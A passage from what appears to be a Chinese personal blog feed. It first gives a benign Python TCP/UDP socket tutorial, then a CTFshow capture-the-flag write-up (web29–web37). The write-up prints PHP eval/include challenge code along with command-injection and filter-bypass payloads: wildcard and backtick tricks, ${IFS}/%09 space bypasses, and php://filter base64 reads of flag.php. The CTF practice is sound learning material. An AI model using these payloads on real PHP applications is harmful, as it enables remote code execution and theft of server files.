%s&#x27; % (bytes(ctime(), &#x27;utf-8&#x27;), data))</span></span><br><span class="line">       tcpCliSock.send(<span class="built_in">bytes</span>(<span class="string">&#x27;[%s] %s&#x27;</span> % (ctime(), data.decode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment">#向客户端发送时间戳数据，必须发送字节数组</span></span><br><span class="line">   tcpCliSock.close()  <span class="comment">#关闭与客户端的连接</span></span><br><span class="line">tcpSerSock.close()  <span class="comment">#关闭服务器socket</span></span><br></pre></td></tr></table></figure>


<h2 id="客户端发送命令，服务端接收命令并执行"><a href="#客户端发送命令，服务端接收命令并执行" class="headerlink" title="客户端发送命令，服务端接收命令并执行"></a>客户端发送命令，服务端接收命令并执行</h2><p>    为了实现客户端与以上的服务端通信，我们创建一个客户端，向服务端发送数据。连接建立后，服务器显示取得连接，然后等待客户端数据，并以时间戳的格式再发送给客户端。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/9/26 10:28</span></span><br><span class="line"><span class="comment"># @Author  : npfs</span></span><br><span class="line"><span class="comment"># @FileName: TCP客户端</span></span><br><span class="line"><span class="comment"># @Blog    ：http://npfs06.top</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;=====================TCP客户端=====================&quot;</span>)</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1&#x27;</span> <span class="comment">#服务器ip地址，等价于localhost</span></span><br><span class="line">PORT = <span class="number">21567</span>  <span class="comment">#通信端口号</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span>  <span class="comment">#接收数据缓冲大小</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line">tcpCliSock = socket(AF_INET, SOCK_STREAM)  <span class="comment">#创建客户端套接字</span></span><br><span class="line">tcpCliSock.connect(ADDR)  <span class="comment">#发起TCP连接</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   data = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)   <span class="comment">#接收用户输入</span></span><br><span class="line">   <span class="keyword">if</span> <span class="keyword">not</span> data:  <span class="comment">#如果用户输入为空，直接回车就会发送&quot;&quot;，&quot;&quot;就是代表false</span></span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   tcpCliSock.send(<span class="built_in">bytes</span>(data, <span class="string">&#x27;utf-8&#x27;</span>))   <span class="comment">#客户端发送消息，必须发送字节数组</span></span><br><span class="line">   data = tcpCliSock.recv(BUFSIZ)   <span class="comment">#接收回应消息，接收到的是字节数组</span></span><br><span class="line">   <span class="keyword">if</span> <span class="keyword">not</span> data:   <span class="comment">#如果接收服务器信息失败，或没有消息回应</span></span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   print(data.decode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment">#打印回应消息，或者str(data,&quot;utf-8&quot;)</span></span><br><span class="line">tcpCliSock.close() <span class="comment">#关闭客户端socket</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>结果如下：</p>
<p>我们先运行服务端程序</p>
<img src="http://img.npfs06.top/20210926110944.png" style="zoom:80%;">



<p>然后再运行客户端程序，回到服务端就可以看到取得连接了</p>
<img src="http://img.npfs06.top/20210926110253.png" style="zoom:80%;">



<p>在客服端输入内容，就可以成功得到服务端的响应</p>
<img src="http://img.npfs06.top/20210926110311.png" style="zoom:80%;">





<h1 id="UDP的原理及特点"><a href="#UDP的原理及特点" class="headerlink" title="UDP的原理及特点"></a>UDP的原理及特点</h1><pre><code>    UDP 是 User Datagram Protocol 的简称， 中文名用户数据报协议，是OSI（Open System Interconnection，开放式系统互联）参考模型中一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务，UDP 在 IP 报文的协议号是 17。

    与 TCP（传输控制协议）协议一样，UDP 协议直接位于 IP（网际协议）协议的顶层。根据 TCP/IP 参考模型，UDP 和TCP 都属于传输层协议。UDP 协议的主要作用是将数据压缩成数据包的形式。一个典型的数据包就是一个二进制数据的传输单位。每一个数据包的前 8 个字节用来包含报头信息，剩余字节则用来包含具体的传输数据。
</code></pre>
<p>     UDP协议与TCP协议的不同在于，它是面向无连接，不可靠的数据报协议。而且不需要建立连接就可以，只需要知道对方的IP地址和端口号，就可以直接发数据包。但是，能不能到达就不知道了。</p>
<p>UDP 报文的具体格式如下：</p>
<img src="http://img.npfs06.top/20210926111505.png" style="zoom:80%;">

<h2 id="UDP-通信过程"><a href="#UDP-通信过程" class="headerlink" title="UDP 通信过程"></a>UDP 通信过程</h2><p>UDP 协议的通信较 TCP 简单了很多，减少了 TCP 的握手、确认、窗口、重传、拥塞控制等机制，UDP 是一个无状态的传输协议。</p>
<p>UDP 客户端在发送数据时并不判断主机是否可达，服务器是否开启等问题，同样它不能确定数据是否成功送达服务器。它只是将数据简单的封了一个包，之后就丢出去了。</p>
<p>UDP通信的流程比较简单，因此要搭建这么一个常用的UDP通信框架也是比较简单的。以下是UDP的框架图</p>
<img src="http://img.npfs06.top/20210926111717.png" style="zoom:80%;">

<p>由以上框图可以看出，客户端要发起一次请求，仅仅需要两个步骤（socket和sendto），而服务器端也仅仅需要三个步骤即可接收到来自客户端的消息（socket、bind、recvfrom）</p>
<h1 id="UDP实现socket的简单通信（python）"><a href="#UDP实现socket的简单通信（python）" class="headerlink" title="UDP实现socket的简单通信（python）"></a>UDP实现socket的简单通信（python）</h1><p>   和TCP类似，使用UDP的通信双方也分为客户端和服务器。</p>
<h2 id="服务端编程-1"><a href="#服务端编程-1" class="headerlink" title="服务端编程"></a>服务端编程</h2><ol>
<li>SOCK_DGRAM指定了这个Socket的类型是UDP。</li>
<li>recvfrom()方法返回数据和客户端的地址与端口，服务器收到数据后，直接调用sendto()就可以把数据用UDP发给客户端。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/9/26 10:23</span></span><br><span class="line"><span class="comment"># @Author  : npfs</span></span><br><span class="line"><span class="comment"># @FileName: 服务端</span></span><br><span class="line"><span class="comment"># @Blog    ：http://npfs06.top</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 监听所有的ip</span></span><br><span class="line">port = <span class="number">21567</span>  <span class="comment"># 接口必须一致</span></span><br><span class="line">bufsize = <span class="number">1024</span></span><br><span class="line">addr = (host, port)</span><br><span class="line"></span><br><span class="line">udpServer = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">udpServer.bind(addr)  <span class="comment"># 开始监听</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">&#x27;等待客户端的连接...&#x27;</span>)</span><br><span class="line">    udpCliSock, addr = udpServer.recvfrom(bufsize)  <span class="comment"># 接收数据和返回地址</span></span><br><span class="line">    print(<span class="string">&#x27;取得连接:&#x27;</span>, addr)</span><br><span class="line">    <span class="comment"># 处理数据</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = udpCliSock.decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>).upper()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:  <span class="comment"># 如果数据空白，则表示客户端退出，所以退出接收</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data =<span class="string">&#x27;[%s] %s&#x27;</span> % (<span class="built_in">bytes</span>(ctime(), <span class="string">&#x27;utf-8&#x27;</span>), data)</span><br><span class="line">        udpServer.sendto(data.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>), addr)</span><br><span class="line">    <span class="comment"># 发送数据</span></span><br><span class="line">    <span class="comment"># print(&#x27;...recevied from and return to :&#x27;, addr)</span></span><br><span class="line"></span><br><span class="line">udpServer.close()</span><br></pre></td></tr></table></figure>


<h2 id="客户端发送命令，服务端接收命令并执行-1"><a href="#客户端发送命令，服务端接收命令并执行-1" class="headerlink" title="客户端发送命令，服务端接收命令并执行"></a>客户端发送命令，服务端接收命令并执行</h2><p>    为了实现客户端与以上的服务端通信，我们创建一个客户端，向服务端发送数据。连接建立后，服务器显示取得连接，然后等待客户端数据，并以时间戳的格式再发送给客户端。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/9/26 10:28</span></span><br><span class="line"><span class="comment"># @Author  : npfs</span></span><br><span class="line"><span class="comment"># @FileName: 客服端2</span></span><br><span class="line"><span class="comment"># @Blog    ：http://npfs06.top</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;127.0.0.1&#x27;</span>  <span class="comment"># 这是客户端的电脑的ip</span></span><br><span class="line">port = <span class="number">21567</span>  <span class="comment"># 接口选择大于10000的，避免冲突</span></span><br><span class="line">bufsize = <span class="number">1024</span>  <span class="comment"># 定义缓冲大小</span></span><br><span class="line"></span><br><span class="line">addr = (host, port)  <span class="comment"># 元祖形式</span></span><br><span class="line">udpClient = socket(AF_INET, SOCK_DGRAM)  <span class="comment"># 创建客户端</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    data = data.encode(encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    udpClient.sendto(data, addr)  <span class="comment"># 发送数据</span></span><br><span class="line">    data, addr = udpClient.recvfrom(bufsize)  <span class="comment"># 接收数据和返回地址</span></span><br><span class="line">    print(data.decode(encoding=<span class="string">&quot;utf-8&quot;</span>), <span class="string">&#x27;from&#x27;</span>, addr)</span><br><span class="line"></span><br><span class="line">udpClient.close()</span><br></pre></td></tr></table></figure>


<p>结果如下：</p>
<p>我们先运行服务端程序</p>
<img src="http://img.npfs06.top/20210926113213.png" style="zoom:80%;">



<p>然后再运行客户端程序，回到服务端就可以看到取得连接了</p>
<img src="http://img.npfs06.top/20210926113247.png" style="zoom:80%;">



<p>在客服端输入内容，就可以成功得到服务端的响应</p>
<img src="http://img.npfs06.top/20210926113308.png" style="zoom:80%;">





<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>之前只是跟着学校课程学习过TCP/IP、UDP等协议，但是从来没有实践过</p>
<p>通过这次实践让我对通信协议有了更加深刻的理解，同时接下去准备利用所学的socket通信知识写一个简单的聊天室</p>
]]></content>
      <categories>
        <category>脚本开发</category>
      </categories>
  </entry>
  <entry>
    <title>CTFshow_web入门_命令执行</title>
    <url>/2020/10/11/CTFshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p> CTFshow_web入门_命令执行</p>
<a id="more"></a>

<p><img src="http://img.npfs06.top/20210225161030.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><a href="http://npfs06.top/2021/02/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/" target="_blank">命令执行小技巧</a>  可以先看下这篇文章，方便接下来的做题</p>
<h2 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解法一：<br>由于过滤了flag，可以使用通配符进行绕过<br>在linux系统中 有一些通配符</p>
<ul>
<li> 匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *<br>  ?    匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0<br>  [abcd]    匹配abcd中任何一个字符<br>  [a-z]    表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">PAYLOAD:c=<span class="built_in">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);</span><br></pre></td></tr></table></figure>




<p>解法二：<br><img src="http://img.npfs06.top/20210225161145.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>了解 eval函数之后</p>
<p>传入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> <span class="string">&quot;npfs&quot;</span>;<span class="meta">?&gt;</span>ctf <span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到有 flag.php文件,之后采用include进行包含读取<br>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">echo</span> <span class="string">&quot;npfs&quot;</span>; <span class="meta">?&gt;</span>ctf <span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);&amp;url=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>


<h2 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该题与29题的不同之处就是增加了对命令执行函数的过滤，命令执行的函数有很多</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">system</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">passthru</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">shell_exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">popen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">proc_open</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">pcntl_exec</span><span class="params">()</span></span></span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
<p>这里需要注意一下，只有system函数是有回显的，其他的函数可以通过echo等显示</p>
<p>这里采用反引号绕过</p>
<p>解法一：</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">payload：c=echo \`cat f*`;</span><br></pre></td></tr></table></figure>
<p>解法二：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo &quot;npfs &quot;; include($_GET[&#39;url&#39;]); ?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>




<h2 id="web-31"><a href="#web-31" class="headerlink" title="web  31"></a>web  31</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>emmmmm ,过滤了空格，单引号等</p>
<p><strong>空格绕过</strong></p>
<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt; 重定向符</span><br><span class="line"><span class="tag">%<span class="selector-tag">09</span>(需要php环境)</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line"><span class="tag">%<span class="selector-tag">20</span></span></span><br><span class="line"><span class="tag">%<span class="selector-tag">09</span></span></span><br></pre></td></tr></table></figure>
<p><strong>cat被过滤</strong></p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">more:</span>一页一页的显示档案内容</span><br><span class="line"><span class="symbol">less:</span>与 more 类似</span><br><span class="line"><span class="symbol">head:</span>查看头几行</span><br><span class="line"><span class="symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"><span class="symbol">tail:</span>查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line"><span class="symbol">od:</span>以二进制的方式读取档案内容</span><br><span class="line"><span class="symbol">vi:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">vim:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">sort:</span>可以查看</span><br><span class="line"><span class="symbol">uniq:</span>可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>解法一：</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"><span class="title">payload:</span> c=echo(`tac%<span class="number">09</span>f*`)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>解法二：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">c=include(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);?&gt;&amp;url=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
<p>直接单引号改双引号即可</p>
<h2 id="web-32"><a href="#web-32" class="headerlink" title="web 32"></a>web 32</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>emmmmm,过滤了括号</p>
<p><img src="http://img.npfs06.top/20210225161206.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>群里大佬的图</p>
<p>这里直接用include 进行无括号包含即可</p>
<p>解法一：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">payload：?c=include <span class="variable">$_GET</span>[<span class="string">&quot;npfs&quot;</span>] ?&gt;&amp;npfs=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
<p>解法二：<br>payload：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?c=include <span class="variable">$_POST</span>[npfs] ?&gt;</span><br><span class="line"> npfs=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
<h2 id="web-33"><a href="#web-33" class="headerlink" title="web 33"></a>web 33</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了单双引号，直接用数组作为参数即可绕过</p>
<p>解法一：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?c=include <span class="variable">$_GET</span>[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
<p>解法二：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?c=include <span class="variable">$_POST</span>[<span class="number">1</span>]?&gt;</span><br><span class="line"><span class="number">1</span>=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web-34"><a href="#web-34" class="headerlink" title="web 34"></a>web 34</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>emmmmm,多过滤了一个分号，不过好像没什么用。。</p>
<p>payload同上</p>
<h2 id="web-35"><a href="#web-35" class="headerlink" title="web 35"></a>web 35</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多过滤了一个这个符号 &lt;  ，好像没什么用哈哈</p>
<p>payload继续同上</p>
<h2 id="web-36"><a href="#web-36" class="headerlink" title="web 36"></a>web 36</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了数字</p>
<p>直接把数字1改成字符就🆗了</p>
<p>payload:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?c=include<span class="variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?c=<span class="built_in">include</span><span class="variable">$_POST</span>[<span class="keyword">a</span>]<span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">a</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web-37"><a href="#web-37" class="headerlink" title="web 37"></a>web 37</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了flag ，又是 include 文件包含</p>
<p>利用伪协议读flag</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">data:<span class="regexp">//</span>，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:<span class="regexp">//</span>流会被当作php文件执行</span><br></pre></td></tr></table></figure>
<p>flag.php 可以用通配符绕过</p>
<p>payload:</p>
